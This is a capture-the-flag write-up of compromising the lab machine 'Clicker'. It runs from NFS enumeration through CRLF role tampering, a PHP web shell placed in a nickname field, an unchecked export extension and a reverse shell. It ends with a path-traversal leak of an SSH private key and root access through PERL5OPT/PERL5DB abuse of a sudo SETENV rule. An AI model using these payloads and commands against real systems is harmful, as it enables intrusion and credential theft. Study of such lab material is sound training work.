# Clicker

## Machine Info

![image-20231123012009225](./Clicker.assets/image-20231123012009225.png)

## Recon

- `nmap -sT -sV -sC -O -p 22,80,111,2049,34137,34211,43801,44631,60685 -oA nmap/detail`

```bash
Nmap scan report for 10.10.11.232
Host is up (0.042s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://clicker.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  2,3        34211/tcp6  mountd
|   100005  2,3        35819/udp6  mountd
|   100005  2,3        43801/tcp   mountd
|   100005  2,3        55641/udp   mountd
|   100021  1,3,4      34211/tcp   nlockmgr
|   100021  1,3,4      44725/tcp6  nlockmgr
|   100021  1,3,4      56089/udp   nlockmgr
|   100021  1,3,4      60151/udp6  nlockmgr
|   100024  1          38629/udp   status
|   100024  1          44631/tcp   status
|   100024  1          49541/udp6  status
|   100024  1          57063/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34137/tcp open  mountd   1-3 (RPC #100005)
34211/tcp open  nlockmgr 1-4 (RPC #100021)
43801/tcp open  mountd   2-3 (RPC #100005)
44631/tcp open  status   1 (RPC #100024)
60685/tcp open  mountd   1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 2049 nfs -> 80 http -> 22 ssh

## Foothold

### 2249 - nfs

- find mount point, mount nfs fs, seek sensitive file

```bash
$ showmount -e $IP
Export list for 10.10.11.232:
/mnt/backups *

$ sudo mount -t nfs $IP:/mnt/backups /mnt/backups

$ file clicker.htb_backup.zip
clicker.htb_backup.zip: Zip archive data, at least v1.0 to extract, compression method=store

$ ls -l
total 2236
-rw-r--r-- 1 qwe qwe 2284115 Nov 22 19:40 clicker.htb_backup.zip
```

- bak file (for 80 http) checking
  - index.php
  - login.php
  - authenticate.php
  - db_utils.php

```php
index.php
        if ($_SESSION["ROLE"] == "") {
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/info.php">Info</a>';
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/login.php">Login</a>';
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/register.php">Register</a>';
            }
            else {
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/profile.php">Profile</a>';
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/logout.php">Logout</a>';
                echo '<a class="nav-link fw-bold py-1 px-0 active" href="/play.php">Play</a>';
          if ($_SESSION["ROLE"] == "Admin") {
            echo '<a class="nav-link fw-bold py-1 px-0 active" href="/admin.php">Administration</a>';
          }
            }
            
login.php

    <form name="login_form" action="authenticate.php" method="post" onsubmit="return validate()">
      <div class="form-group">
        <label for="inputUsername">Username</label>
        <input class="form-control" name='username' id="exampleInputUsername1" aria-describedby="usernameHelp" placeholder="Username">
      </div>
      <div class="form-group">
        <label for="inputPassword">Password</label>
        <input type="password" name='password' class="form-control" id="InputPassword" placeholder="Password">
      </div>
      <button type="submit" class="btn btn-primary">Submit</button>
    </form>

authenticate.php
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
        if(check_auth($_POST['username'], $_POST['password'])) {
                $_SESSION["PLAYER"] = $_POST["username"];
                $profile = load_profile($_POST["username"]);
                $_SESSION["NICKNAME"] = $profile["nickname"];
                $_SESSION["ROLE"] = $profile["role"];
                $_SESSION["CLICKS"] = $profile["clicks"];
                $_SESSION["LEVEL"] = $profile["level"];
                header('Location: /index.php');
        }
        else {
                header('Location: /login.php?err=Authentication Failed');
        }
}
?>


db_utils.php

function check_auth($player, $password) {
	global $pdo;
	$params = ["player" => $player];
	$stmt = $pdo->prepare("SELECT password FROM players WHERE username = :player");
	$stmt->execute($params);
	if ($stmt->rowCount() > 0) {
		$row = $stmt->fetch(PDO::FETCH_ASSOC);
		if(strcmp($row['password'], hash("sha256",$password)) == 0){
			return true;
		}
	}
	return false;
}
```

### 80 - http

#### website priv esca -> admin

- register a user-priv account -> look for priv esca in this site
- register admin [x] -> admin account exists

- hash in `diagonostic.php` -> crack [x]

```php
<?php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
}
```

- seek for sqli point without precompiled sql statement

```php
function get_top_players($number) {
	global $pdo;
	$stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
	$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
	return $result;
}
```

- `save_game.php`: role can be configed -> detected -> how to bypass

![image-20231123014150618](./Clicker.assets/image-20231123014150618.png)

- CRLF bypass trick: [CRLF (%0D%0A) Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a) -> user -> admin

![image-20231123014438343](./Clicker.assets/image-20231123014438343.png)

![image-20231123014441858](./Clicker.assets/image-20231123014441858.png)

- logout -> login -> admin priv **(!!!don't do anything else, otherwise original priv would be setted)**

#### export -> foothold

- `export.php`: extension choice: txt, json, html

```php
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
    ...
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
```

```php
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
```

- filename string is concated without checking -> attack vector -> change extension [y]

![image-20231123014741603](./Clicker.assets/image-20231123014741603.png)

- analyse nickname field for account info: shown can be configed

```
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
	if(check_auth($_POST['username'], $_POST['password'])) {
		$_SESSION["PLAYER"] = $_POST["username"];
		$profile = load_profile($_POST["username"]);
		$_SESSION["NICKNAME"] = $profile["nickname"];
		$_SESSION["ROLE"] = $profile["role"];
		$_SESSION["CLICKS"] = $profile["clicks"];
		$_SESSION["LEVEL"] = $profile["level"];
		header('Location: /index.php');
	}
	else {
		header('Location: /login.php?err=Authentication Failed');
	}
}
?>
```

- register a new user -> uuu:0
- save_game.php -> **param config** -> change **nickname** from authenticate.php -> nickname with one cmd invoke -> `<?php system($_GET["cmd"]);?>`

![image-20231123015040227](./Clicker.assets/image-20231123015040227.png)

- POC: nickname changed

![image-20231123015154079](./Clicker.assets/image-20231123015154079.png)

- **RCE** to get a shell: id [y], which curl [y] -> curl a rshell and execute it

![image-20231123015209973](./Clicker.assets/image-20231123015209973.png)

![image-20231123015243527](./Clicker.assets/image-20231123015243527.png)

```bash
bash-5.1$ uname -a
Linux clicker 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
bash-5.1$ ip a  ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:f1:a8 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.232/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:f1a8/64 scope global dynamic mngtmpaddr
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:f1a8/64 scope link
       valid_lft forever preferred_lft forever
```

## Privilege Escalation

### enumeration

- /etc/passwd -> root, www-data, jack
- port 3306 - mysql

### www-data -> jack

- files in `/opt/`

```bash
total 16K
4.0K drwxr-xr-x 18 root root 4.0K Sep  5 19:19 ..
4.0K drwxr-xr-x  2 jack jack 4.0K Jul 21 22:29 manage
4.0K drwxr-xr-x  3 root root 4.0K Jul 20 10:00 .
4.0K -rwxr-xr-x  1 root root  504 Jul 20 10:00 monitor.sh

total 28K
4.0K drwxr-xr-x 2 jack jack 4.0K Jul 21 22:29 .
4.0K -rw-rw-r-- 1 jack jack  256 Jul 21 22:29 README.txt
4.0K drwxr-xr-x 3 root root 4.0K Jul 20 10:00 ..
 16K -rwsrwsr-x 1 jack jack  16K Feb 26  2023 execute_query
bash-5.1$ cat README.txt
cat README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

- hash file uncrackable [x]

```bash
bash-5.1$ /execute_query 3
./execute_query 3
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------
```

- execute_query 5 also tries to cat a file -> guess this tool is under the **jack's home** -> get ssh private key

```bash
./execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- priv esca -> jack

```
$ chmod 600 id_rsa && ssh -i id_rsa jack@10.10.11.232
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Nov 22 01:54:17 PM UTC 2023

  System load:           0.080078125
  Usage of /:            53.4% of 5.77GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             247
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.232
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f1a8

-bash-5.1$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

### jack -> root

- suid, guid [x]
- sudo [y] -> `sudo -l` -> `(root) SETENV: NOPASSWD: /opt/monitor.sh` (key script)

```
-bash-5.1$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

```bash
$ cat monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

- all command is absolute path -> PATH usage [x]
- unset PERL5LIB and PERLLIB -> perl env -> only perl script **/usr/bin/xml_pp** (other all elf files)

```perl
$ cat /usr/bin/xml_pp
#!/usr/bin/perl -w
# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $
use strict;

use XML::Twig;
use File::Temp qw/tempfile/;
use File::Basename qw/dirname/;

my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
my $styles= join '|', @styles;               # for usage
my %styles= map { $_ => 1} @styles;          # to check option
```

- searchsploit perl and privilege escalation related exps

```bash
$ searchsploit perl priv
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exim - 'perl_startup' Local Privilege Escalation (Metasploit)                                                                        | linux/local/39702.rb
NetIQ Privileged User Manager 2.3.1 - 'ldapagnt_eval()' Perl Remote Code Execution (Metasploit)                                      | windows/remote/22903.rb
Novell NetIQ Privileged User Manager 2.3.1 - 'ldapagnt.dll' ldapagnt_eval() Perl Code Evaluation Remote Code Execution               | windows/remote/22738.txt
Setuid perl - 'PerlIO_Debug()' Root Owned File Creation Privilege Escalation                                                         | linux/local/792.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- perl startup [ok], [Exim - 'perl_startup' Local Privilege Escalation (Metasploit) - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/39702)
- key usage: `cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-})` -> two env vars and one cmd -> treated sudo rule `SETENV`

- POC: `sudo PERL5OPT=-d PERL5DB='exec "id"' /opt/monitor.sh` -> id as root

```bash
$ sudo PERL5OPT=-d PERL5DB='exec "id"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
uid=0(root) gid=0(root) groups=0(root)
```

- give bash suid and execute it as the root priv

```bash
bash-5.1# sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /usr/bin/bash"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
bash-5.1# bash -p
bash-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(jack)
bash-5.1# cd /root
bash-5.1# pwd
/root
bash-5.1# ls
diagnostic_files  restore  root.txt
```

